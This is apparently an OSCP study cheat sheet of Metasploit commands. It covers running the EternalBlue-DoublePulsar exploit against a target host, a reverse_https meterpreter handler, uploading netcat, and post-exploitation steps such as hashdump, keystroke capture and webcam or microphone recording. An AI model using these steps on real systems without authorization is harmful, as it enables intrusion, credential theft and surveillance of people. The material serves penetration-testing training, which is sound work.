
-   See [*Metasploit Unleashed
    Course*](https://www.offensive-security.com/metasploit-unleashed/)
    in the Essentials

-   Search for exploits using Metasploit GitHub framework source code:  
    [*https://github.com/rapid7/metasploit-framework*](https://github.com/rapid7/metasploit-framework)  
    Translate them for use on OSCP LAB or EXAM.

-   Metasploit

    -   MetaSploit requires Postfresql  
    
        `systemctl start postgresql`

    -   To enable Postgresql on startup  
    
        `systemctl enable postgresql`

-   MSF Syntax

    -   Start metasploit  
        
        `msfconsole  `
        
        `msfconsole -q`

    -   Show help for command  
    
        `show -h`

    -   Show Auxiliary modules  
    
        `show auxiliary`

    -   Use a module  
    
        `use auxiliary/scanner/snmp/snmp_enum  
        use auxiliary/scanner/http/webdav_scanner  
        use auxiliary/scanner/smb/smb_version  
        use auxiliary/scanner/ftp/ftp_login  
        use exploit/windows/pop3/seattlelab_pass`

    -   Show the basic information for a module  
    
        `info`

    -   Show the configuration parameters for a module  
    
        `show options`

    -   Set options for a module  
    
        `set RHOSTS 192.168.1.1-254  
        set THREADS 10`

    -   Run the module  
    
        `run`

    -   Execute an Exploit 
    
        `exploit`

    -   Search for a module  
    
       `search type:auxiliary login`

-   Metasploit Database Access

    -   Show all hosts discovered in the MSF database  
    
        `hosts`

    -   Scan for hosts and store them in the MSF database  
    
        `db_nmap`

    -   Search machines for specific ports in MSF database 
    
        `services -p 443`

    -   Leverage MSF database to scan SMB ports (auto-completed rhosts)  
        
        `services -p 443 --rhosts`

-   Staged and Non-staged

    -   Non-staged payload - is a payload that is sent in its entirety in one go

    -   Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus
 
 -   MS 17-010 - EternalBlue

    -   You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video:
    https://www.youtube.com/watch?v=4OHLor9VaRI
    
      
      1. First step is to configure the Kali to work with wine 32bit
      
      `dpkg --add-architecture i386 && apt-get update && apt-get install wine32
      rm -r ~/.wine
      wine cmd.exe
      exit`
            
      2. Download the exploit repostory
      https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
      
      3. Move the exploit to /usr /share /metasploit-framework /modules /exploits /windows /smb

      4. Start metasploit console
      

I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.

      
      `use exploit/windows/smb/eternalblue_doublepulsar
      msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
      RHOST => 10.11.1.73
      msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
      PROCESSINJECT => spoolsv.exe
      msf exploit(eternalblue_doublepulsar) > run`
      


-   Experimenting with Meterpreter

    -   Get system information from Meterpreter Shell  
    
        `sysinfo`

    -   Get user id from Meterpreter Shell  
    
        `getuid`

    -   Search for a file  
    
        `search -f *pass*.txt`

    -   Upload a file  
    
        `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`

    -   Download a file  
    
        `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`

    -   Invoke a command shell from Meterpreter Shell  
    
        `shell`

    -   Exit the meterpreter shell  
    
        `exit`

-   Metasploit Exploit Multi Handler

    -   multi/handler to accept an incoming reverse\_https\_meterpreter
    
        `payload  
        use exploit/multi/handler  
        set PAYLOAD windows/meterpreter/reverse_https  
        set LHOST $ip  
        set LPORT 443  
        exploit  
        [*] Started HTTPS reverse handler on https://$ip:443/`

-   Building Your Own MSF Module

    -   `mkdir -p ~/.msf4/modules/exploits/linux/misc  
        cd ~/.msf4/modules/exploits/linux/misc  
        cp
        /usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb
        ./crossfire.rb  
        nano crossfire.rb`

-   Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)

    -   `download` Download a file or directory  
        `upload` Upload a file or directory  
        `portfwd` Forward a local port to a remote service  
        `route` View and modify the routing table  
        `keyscan_start` Start capturing keystrokes  
        `keyscan_stop` Stop capturing keystrokes  
        `screenshot` Grab a screenshot of the interactive desktop  
        `record_mic` Record audio from the default microphone for X seconds  
        `webcam_snap` Take a snapshot from the specified webcam  
        `getsystem` Attempt to elevate your privilege to that of local system.  
        `hashdump` Dumps the contents of the SAM database

-   Meterpreter Post Exploitation Features

    -   Create a Meterpreter background session  
    
        `background`